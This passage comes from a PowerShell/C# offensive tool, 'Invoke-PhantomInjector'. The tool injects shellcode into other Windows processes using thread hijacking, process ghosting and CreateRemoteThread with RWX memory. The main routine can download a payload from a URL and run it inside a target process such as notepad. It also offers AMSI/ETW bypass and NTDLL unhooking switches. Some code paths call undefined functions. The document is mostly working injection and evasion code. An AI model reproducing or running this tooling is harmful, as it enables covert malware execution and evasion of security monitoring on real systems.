                            System.Threading.ThreadPool.QueueUserWorkItem(_ => {
                                System.Threading.Thread.Sleep(timeoutMS);
                                if (SuspendThread(hThread) != 0xFFFFFFFF) {
                                    context.Rip = originalRip;
                                    context.Rsp = originalRsp;
                                    SetThreadContext(hThread, ref context);
                                    ResumeThread(hThread);
                                }
                                CloseHandle(hThread);
                            });

                            ResumeThread(hThread);
                            return true;
                        }
                    }
                }
                CloseHandle(hThread);
                hThread = IntPtr.Zero;
            }
            return false;
        }
        finally {
            if (hThread != IntPtr.Zero) CloseHandle(hThread);
            if (allocAddr != IntPtr.Zero) CloseHandle(allocAddr);
            if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
        }
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

    try {
        Add-Type -TypeDefinition $hijackCode -ErrorAction Stop
        
        if ($ProcessId -eq 0) {
            $targetProcess = Get-Process -Name $ProcessName -ErrorAction Stop | Select-Object -First 1
            $ProcessId = $targetProcess.Id
        }

        Write-Verbose "Attempting safe thread hijack on PID: $ProcessId with ${TimeoutMS}ms timeout"
        
        $result = [ThreadHijacker]::SafeHijack($ProcessId, $Shellcode, $TimeoutMS)
        
        if ($result) {
            Write-Verbose "[+] Thread hijacking completed (crash-protected)"
            return $true
        } else {
            Write-Warning "[-] Thread hijacking failed or timed out"
            return $false
        }
    }
    catch {
        Write-Warning "[-] Thread hijacking error: $_"
        return $false
    }
}

function Invoke-ProcessGhostingInjection {
    param(
		[switch]$UseGhosting,
		[switch]$DebugMode,
        [Parameter(Mandatory=$true)]
        [byte[]]$Shellcode,

        [Parameter()]
        [string]$TemplatePath = "$env:WinDir\System32\charmap.exe"
    )

    #─────────────────────────────────────────────────────────────────────────────
    #region C# Injector + Syscall Resolver (Updated)
    #─────────────────────────────────────────────────────────────────────────────
    $csCode = @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.ComponentModel;

public static class Injector {
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [DllImport("kernel32.dll", EntryPoint = "CreateProcessW", 
               CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool   bInheritHandles,
        uint   dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref    STARTUPINFO lpStartupInfo,
        out    PROCESS_INFORMATION lpProcessInformation);


    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint GetProcessId(IntPtr hProcess);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        UIntPtr dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);
        
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId);

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;
        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;
        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;
    }
    
    public static bool InjectViaRemoteThread(IntPtr hProcess, byte[] shellcode) {
        // 1) Allocate RWX memory
        IntPtr remoteMem = VirtualAllocEx(
            hProcess,
            IntPtr.Zero,
            (uint)shellcode.Length,
            0x3000,    // MEM_COMMIT | MEM_RESERVE
            0x40       // PAGE_EXECUTE_READWRITE
        );
        if (remoteMem == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualAllocEx failed");

        // 2) Write shellcode
        UIntPtr written;
        if (!WriteProcessMemory(
                hProcess,
                remoteMem,
                shellcode,
                (uint)shellcode.Length,
                out written))
        {
            throw new Win32Exception(Marshal.GetLastWin32Error(), "WriteProcessMemory failed");
        }

        // 3) Spawn a remote thread
        uint threadId;
        IntPtr hThread = CreateRemoteThread(
            hProcess,
            IntPtr.Zero,
            UIntPtr.Zero,
            remoteMem,
            IntPtr.Zero,
            0,
            out threadId
        );
        if (hThread == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateRemoteThread failed");

        // 4) Resume it immediately
        ResumeThread(hThread);

        // 5) Clean up the thread handle
        CloseHandle(hThread);
        return true;
    }

    public static void HijackAndInject(IntPtr hProcess, byte[] shellcode) {
        // Allocate memory in target process
        IntPtr remoteMem = VirtualAllocEx(
            hProcess,
            IntPtr.Zero,
            (uint)shellcode.Length,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40);  // PAGE_EXECUTE_READWRITE

        if (remoteMem == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualAllocEx failed");

        // Write shellcode
        UIntPtr bytesWritten;
        if (!WriteProcessMemory(hProcess, remoteMem, shellcode, (uint)shellcode.Length, out bytesWritten))
            throw new Win32Exception(Marshal.GetLastWin32Error(), "WriteProcessMemory failed");

        // Change protection to RX
        uint oldProtect;
        if (!VirtualProtectEx(hProcess, remoteMem, (uint)shellcode.Length, 0x20, out oldProtect))
            throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualProtectEx failed");

        // Get process ID from handle
        uint processId = GetProcessId(hProcess);
        Process targetProcess = Process.GetProcessById((int)processId);
        
        if (targetProcess.Threads.Count == 0)
            throw new Exception("No threads found in target process");

        ProcessThread mainThread = targetProcess.Threads[0];
        
        // Open the thread
        IntPtr hThread = OpenThread(0x001F03FF, false, (uint)mainThread.Id);
        if (hThread == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenThread failed");

        try {
            // Spawn a thread directly into our shellcode
            uint threadId;
            IntPtr hRemoteThread = CreateRemoteThread(
                hProcess,
                IntPtr.Zero,
                UIntPtr.Zero,
                remoteMem,
                IntPtr.Zero,
                0,
                out threadId
            );
            if (hRemoteThread == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateRemoteThread failed");

            // Wait for execution
            System.Threading.Thread.Sleep(2000);

            // Clean up the remote thread handle
            CloseHandle(hRemoteThread);
        }
        finally {
            // Clean up the original thread handle
            CloseHandle(hThread);
        }
    }
}
'@

    # Compile C# code
    try {
        Add-Type -TypeDefinition $csCode -Language CSharp -ErrorAction Stop
    }
    catch {
        Write-Error "Failed to compile C# code: $_"
        return
    }

    # ─────────────────────────────────────────────────────────────────────────
    # Rebuild the C# injector assembly with fixed CreateProcessGhost (includes hSection)
    # ─────────────────────────────────────────────────────────────────────────
    $csCode1 = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.ComponentModel;

public static class Injector1 {
    [StructLayout(LayoutKind.Sequential)]
    public struct IO_STATUS_BLOCK {
        public IntPtr Status;
        public ulong Information;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
        public UNICODE_STRING(string s) {
            Length = (ushort)(s.Length * 2);
            MaximumLength = (ushort)(Length + 2);
            Buffer = Marshal.StringToHGlobalUni(s);
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
        public OBJECT_ATTRIBUTES(UNICODE_STRING name) : this(name, 0, IntPtr.Zero, IntPtr.Zero) {}
        public OBJECT_ATTRIBUTES(UNICODE_STRING name, uint attributes, IntPtr rootDirectory, IntPtr securityDescriptor) {
            Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
            RootDirectory = rootDirectory;
            ObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
            Marshal.StructureToPtr(name, ObjectName, false);
            Attributes = attributes;
            SecurityDescriptor = securityDescriptor;
            SecurityQualityOfService = IntPtr.Zero;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct FILE_DISPOSITION_INFORMATION {
        [MarshalAs(UnmanagedType.U1)]
        public bool DeleteFile;
    }

    public enum FileDispositionInfoClass : uint {
        FileDispositionInformation = 4
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint   AllocationProtect;
        public UIntPtr RegionSize;
        public uint   State;
        public uint   Protect;
        public uint   Type;
    }

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtOpenFile(
        out IntPtr FileHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        out IO_STATUS_BLOCK IoStatusBlock,
        uint ShareAccess,
        uint OpenOptions
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtSetInformationFile(
        IntPtr FileHandle,
        ref IO_STATUS_BLOCK IoStatusBlock,
        IntPtr FileInformation,
        uint Length,
        FileDispositionInfoClass FileInformationClass
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtCreateSection(
        out IntPtr SectionHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        ulong MaximumSize,
        uint SectionPageProtection,
        uint AllocationAttributes,
        IntPtr FileHandle
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtCreateProcessEx(
        out IntPtr ProcessHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ParentProcess,
        uint Flags,
        IntPtr SectionHandle,
        IntPtr DebugPort,
        IntPtr ExceptionPort,
        bool InJob
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtQueryVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        int MemoryInformationClass,
        out MEMORY_BASIC_INFORMATION MemoryInformation,
        UIntPtr MemoryInformationLength,
        out UIntPtr ReturnLength
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtCreateThreadEx(
        out IntPtr threadHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        bool createSuspended,
        uint stackZeroBits,
        uint sizeOfStackCommit,
        uint sizeOfStackReserve,
        IntPtr attributeList
    );

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    // ─────────────────────────────────────────────────────────────────────────
    // Full CreateProcessGhost with swallowed primary-thread errors
    // ─────────────────────────────────────────────────────────────────────────
    public static IntPtr CreateProcessGhost(string tempPath, byte[] payload) {
        // 1) Write stub to disk
        File.WriteAllBytes(tempPath, payload);

        // 2) Open for delete-pending
        IO_STATUS_BLOCK iosb;
        var oa = new OBJECT_ATTRIBUTES(new UNICODE_STRING(tempPath), 0, IntPtr.Zero, IntPtr.Zero);
        const uint DELETE      = 0x00010000;
        const uint SYNCHRONIZE = 0x00100000;
        const uint GENERIC_WR  = 0x40000000;
        const uint SHARE_R     = 0x00000001;
        const uint SHARE_W     = 0x00000002;
        const uint SYNC_IO     = 0x00000020;
        IntPtr hFile;
        NtOpenFile(out hFile, DELETE | SYNCHRONIZE | GENERIC_WR, ref oa, out iosb, SHARE_R | SHARE_W, SYNC_IO);

        // 3) Mark delete-pending
        var fdi = new FILE_DISPOSITION_INFORMATION { DeleteFile = true };
        IntPtr buf = Marshal.AllocHGlobal(Marshal.SizeOf(fdi));
        Marshal.StructureToPtr(fdi, buf, false);
        NtSetInformationFile(hFile, ref iosb, buf, (uint)Marshal.SizeOf(fdi),
                             FileDispositionInfoClass.FileDispositionInformation);
        Marshal.FreeHGlobal(buf);

        // 4) Create section
        IntPtr hSection;
        const uint PAGE_EXEC_READ = 0x20;
        const uint SEC_IMAGE      = 0x1000000;
        const uint SEC_ALL_ACCESS = 0x10000000;
        NtCreateSection(out hSection, SEC_ALL_ACCESS, IntPtr.Zero, 0, PAGE_EXEC_READ, SEC_IMAGE, hFile);

        // 5) Close stub file handle
        CloseHandle(hFile);

        // 6) Create suspended process
        IntPtr hProcess;
        const uint PROC_ALL_ACCESS  = 0x001F0FFF;
        const uint CREATE_SUSPENDED = 0x00000004;
        int status = NtCreateProcessEx(
            out hProcess,
            PROC_ALL_ACCESS,
            IntPtr.Zero,
            GetCurrentProcess(),
            CREATE_SUSPENDED,
            hSection,
            IntPtr.Zero,
            IntPtr.Zero,
            false
        );
        if (status != 0 || hProcess == IntPtr.Zero)
            throw new Win32Exception(status, "NtCreateProcessEx failed");

        // 7) Query real mapped base
        MEMORY_BASIC_INFORMATION mbi;
        UIntPtr retLen;
        int memStatus = NtQueryVirtualMemory(
            hProcess,
            IntPtr.Zero,
            0,
            out mbi,
            (UIntPtr)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)),
            out retLen
        );
        if (memStatus != 0)
            throw new Win32Exception(memStatus, "NtQueryVirtualMemory failed");

        // 8) Get EntryPoint RVA from stub on disk
        uint entryRva;
        using (var fs = new FileStream(tempPath, FileMode.Open, FileAccess.Read))
        using (var br = new BinaryReader(fs)) {
            fs.Seek(0x3C, SeekOrigin.Begin);
            int e_lfanew = br.ReadInt32();
            long optHeader = e_lfanew + 24;
            fs.Seek(optHeader + 16, SeekOrigin.Begin);
            entryRva = br.ReadUInt32();
        }

        // 9) Compute absolute entrypoint
        IntPtr startAddress = new IntPtr(mbi.AllocationBase.ToInt64() + entryRva);

        // 10) Attempt stub's primary thread but swallow any failure
        try {
            IntPtr hThread;
            uint thStatus = NtCreateThreadEx(
                out hThread,
                0x1FFFFF,
                IntPtr.Zero,
                hProcess,
                startAddress,
                IntPtr.Zero,
                false,
                0,0,0,
                IntPtr.Zero
            );
            if (hThread != IntPtr.Zero && thStatus == 0) {
                ResumeThread(hThread);
                CloseHandle(hThread);
            }
        } catch {
            // ignore primary-thread failures
        }

        // 11) Return ghosted process handle for injection
        return hProcess;
    }
}
'@

    # Compile
    try {
        Add-Type -TypeDefinition $csCode1 -Language CSharp -ErrorAction Stop
    }
    catch {
        Write-Error "Failed to compile C# code: $_"
        return
    }

    # ─────────────────────────────────────────────────────────────────────────────
    # Helper: Enable SeDebugPrivilege so we can open any process & create remote threads
    # ─────────────────────────────────────────────────────────────────────────────
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

namespace Win32Utils {
    public static class TokenAdjust {
        [StructLayout(LayoutKind.Sequential)]
        public struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES {
            public int PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }

        [DllImport("advapi32.dll", ExactSpelling=true, SetLastError=true)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("kernel32.dll", ExactSpelling=true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool LookupPrivilegeValue(
            string lpSystemName,
            string lpName,
            out LUID lpLuid);

        [DllImport("advapi32.dll", ExactSpelling=true, SetLastError=true)]
        public static extern bool AdjustTokenPrivileges(
            IntPtr TokenHandle,
            bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState,
            int BufferLength,
            IntPtr PreviousState,
            IntPtr ReturnLength);
    }
}
'@ -Language CSharp -ErrorAction Stop

    $kernel32Def = @'
using System;
using System.Runtime.InteropServices;

public static class Kernel32 {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
'@

    try {
        Add-Type -TypeDefinition $kernel32Def -ErrorAction Stop
    } catch {
        Write-Error "Failed to compile Kernel32 P/Invoke: $_"
        return
    }

    # 3) Load payload
    try {
        # ─────────────────────────────────────────────────────────────────────────
        # Ghost+Inject (simplified, no C# changes needed)
        # ─────────────────────────────────────────────────────────────────────────
        if ($UseGhosting) {
            Write-Verbose "==> Starting simplified ghost+inject"

            # 1) Copy Notepad.exe to a temp stub
            $stubName = [guid]::NewGuid().ToString() + '.exe'
            $stubPath = Join-Path $env:TEMP $stubName
            Write-Verbose "Copying stub to: $stubPath"
            Copy-Item -Path "$env:WinDir\System32\notepad.exe" -Destination $stubPath -Force

            # 2) Ghost that stub
            $stubBytes = [IO.File]::ReadAllBytes($stubPath)
            Write-Verbose "Calling CreateProcessGhost($stubPath, ...)"
            $hGhost = [Injector1]::CreateProcessGhost($stubPath, $stubBytes)
            Write-Verbose "Ghost handle: $hGhost"

            # 3) Resume the ghost so it actually has a running thread
            Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class ResumeHelper {
    [DllImport("ntdll.dll")]
    public static extern uint NtResumeProcess(IntPtr ProcessHandle);
}
'@ -Language CSharp -ErrorAction Stop
            [void][ResumeHelper]::NtResumeProcess($hGhost)
            Write-Verbose "Resumed ghosted process"

            # 4) Open for full access
            $pid1   = [Injector]::GetProcessId($hGhost)
            Write-Verbose "Ghost PID: $pid1"
            $hProc = [Injector]::OpenProcess(0x1FFFFF, $false, [uint32]$pid1)
            Write-Verbose "Process handle for injection: $hProc"
			Start-Sleep 5
            # 5) Inject your payload shellcode ($buf)
            Write-Verbose "Injecting payload..."
            try {
                [Injector]::InjectViaRemoteThread($hProc, $buf)
                Write-Verbose "Injected via NtCreateThreadEx"
            }
            catch {
                Write-Warning "NtCreateThreadEx failed, falling back to CreateRemoteThread"
                [Injector]::InjectViaRemoteThread($hProc, $buf)
                Write-Verbose "Injected via CreateRemoteThread"
            }

            return
        }

        # ─────────────────────────────────────────────────────────────────────────
        # 7) Perform injection with enhanced verification and debugging
        # ─────────────────────────────────────────────────────────────────────────
        try {
            # Validate process handle
            if ($hProc -eq [IntPtr]::Zero) {
                throw 'Invalid process handle (null pointer)'
            }

            # Test handle validity
            try {
                $testPid = [Injector]::GetProcessId($hProc)
                if ($testPid -eq 0) {
                    throw 'Process handle is invalid (failed to get PID)'
                }
                Write-Verbose ("Handle validated for PID: {0}" -f $testPid)
            }
            catch {
                throw "Handle validation failed: $_"
            }

            # Perform injection
            Write-Verbose 'Starting injection...'
            if ($UseGhosting) {
                try {
                    [Injector1]::InjectViaNtCreateThreadEx($hProc, $buf)
                    Write-Verbose 'Injection successful via NtCreateThreadEx'
                }
                catch {
                    Write-Warning 'NtCreateThreadEx failed, falling back to CreateRemoteThread'
                    [Injector]::InjectViaRemoteThread($hProc, $buf)
                    Write-Verbose 'Injection successful via CreateRemoteThread'
                }
            }
            else {
                [Injector]::HijackAndInject($hProc, $buf)
                Write-Verbose 'Injection successful via HijackAndInject'
            }

            # Post-injection verification
            Start-Sleep -Seconds 2
            $proc = Get-Process -Id $targetProcess.Id -ErrorAction SilentlyContinue
            if (-not $proc) {
                Write-Host '[!] Process terminated after injection' -ForegroundColor Red
                return $false
            }
        }
        finally {
            if ($hProc -ne [IntPtr]::Zero) {
                [Injector]::CloseHandle($hProc) | Out-Null
                Write-Verbose 'Process handle closed'
            }
        }
    }
    catch {
        Write-Error "Injection failed: $_"
        return $false
    }

    return $true
}

function Invoke-RemoteThreadInjection {
    param(
        [byte[]]$Shellcode,
        [string]$ProcessName,
        [int]$ProcessId
    )

    $remoteCode = @"
using System;
using System.Runtime.InteropServices;

public class RemoteInjector {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public static bool Inject(int processId, byte[] shellcode) {
        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)processId);
        if (hProcess == IntPtr.Zero) return false;

        IntPtr allocAddr = VirtualAllocEx(
            hProcess,
            IntPtr.Zero,
            (uint)shellcode.Length,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (allocAddr == IntPtr.Zero) {
            CloseHandle(hProcess);
            return false;
        }

        UIntPtr bytesWritten;
        if (!WriteProcessMemory(
                hProcess,
                allocAddr,
                shellcode,
                (uint)shellcode.Length,
                out bytesWritten)) {
            CloseHandle(hProcess);
            return false;
        }

        uint threadId;
        IntPtr hThread = CreateRemoteThread(
            hProcess,
            IntPtr.Zero,
            0,
            allocAddr,
            IntPtr.Zero,
            0,
            out threadId);

        if (hThread == IntPtr.Zero) {
            CloseHandle(hProcess);
            return false;
        }

        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    }
}
"@
    try {
        Add-Type -TypeDefinition $remoteCode -ErrorAction Stop
        
        if ($ProcessId -eq 0) {
            $targetProcess = Get-Process -Name $ProcessName -ErrorAction Stop | Select-Object -First 1
            $ProcessId = $targetProcess.Id
        }

        if ([RemoteInjector]::Inject($ProcessId, $Shellcode)) {
            Write-Verbose "[+] Remote thread injection successful"
            return $true
        } else {
            Write-Warning "[-] Remote thread injection failed"
            return $false
        }
    }
    catch {
        Write-Warning "[-] Remote thread injection error: $_"
        return $false
    }
}
#endregion

#region Main Execution
function Invoke-PhantomInjector {
	[CmdletBinding(DefaultParameterSetName='Local')]
    param(
        [Parameter(Mandatory=$true, ParameterSetName='Remote')]
        [ValidateNotNullOrEmpty()]
        [string]$PayloadUrl,

        [Parameter(Mandatory=$true, ParameterSetName='Local')]
        [ValidateNotNullOrEmpty()]
        [string]$PayloadPath,
		
		[Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$ProcessName = 'notepad',

        [Parameter()]
        [ValidateRange(0, [int]::MaxValue)]
        [int]$ProcessId = 0,

        [ValidateSet('APC','ThreadHijack','GhostProcess','RemoteThread','ModuleStomping')]
        [string]$InjectionMethod = 'APC',

        [switch]$UnhookNTDLL,
        [switch]$UseSyscalls,
        [switch]$BypassAMSI,
        [switch]$BypassETW,
        [switch]$DebugMode
    )
	
    # Initialize evasion techniques
    Invoke-Initialization

    # Load payload
    try {
        if ($PSCmdlet.ParameterSetName -eq 'Remote') {
            Write-Verbose "[*] Downloading payload from $PayloadUrl"
            $buf = (New-Object Net.WebClient).DownloadData($PayloadUrl)
        }
        else {
            Write-Verbose "[*] Reading payload from $PayloadPath"
            $buf = [IO.File]::ReadAllBytes($PayloadPath)
        }
    }
    catch {
        Write-Error "[-] Failed to load payload: $_"
        return
    }

    # Select injection method
    switch ($InjectionMethod) {
        'APC' {
            $success = Invoke-APCInjection -Shellcode $buf -ProcessName $ProcessName -ProcessId $ProcessId
        }
        'ThreadHijack' {
            $success = Invoke-ThreadHijack -Shellcode $buf -ProcessName $ProcessName -ProcessId $ProcessId
        }
        'GhostProcess' {
            $success = Invoke-ProcessGhostingInjection -Shellcode $buf -UseGhosting
        }
        'RemoteThread' {
            $success = Invoke-RemoteThreadInjection -Shellcode $buf -ProcessName $ProcessName -ProcessId $ProcessId
        }
		'ModuleStomping' {
			$success = Invoke-ModuleStompingInjection -Shellcode $buf -ProcessName $ProcessName -ProcessId $ProcessId
		}
        default {
            Write-Warning "[-] Invalid injection method specified"
            return
        }
    }

    if ($success) {
        Write-Host "[+] Injection successful!" -ForegroundColor Green
    } else {
        Write-Warning "[-] Injection failed"
    }
}

if ($PSBoundParameters.Count -gt 0) {
    Invoke-PhantomInjector @PSBoundParameters
}
